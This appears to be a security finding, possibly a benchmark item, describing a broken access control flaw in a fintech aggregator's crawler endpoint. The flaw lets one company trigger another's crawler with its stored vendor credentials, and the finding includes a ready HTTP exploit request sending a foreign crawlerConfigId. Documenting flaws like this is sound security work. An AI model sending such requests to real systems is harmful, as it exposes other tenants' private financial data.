diagnosis: The crawler trigger endpoint looks up crawler job settings and associated vault credentials by crawlerConfigId without verifying that job.companyId matches req.user.companyId. An authenticated user can submit another company's crawlerConfigId, causing Puppeteer to log in using that company's stored vendor portal credentials and returning their private statement data.
exploit_request:
POST /api/crawlers/run HTTP/1.1
Host: aggregator.fintech-hub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5c...
Content-Type: application/json

{
  "crawlerConfigId": "4c9e88d1-4b13-43aa-a82f-2d93eef1a011"
}
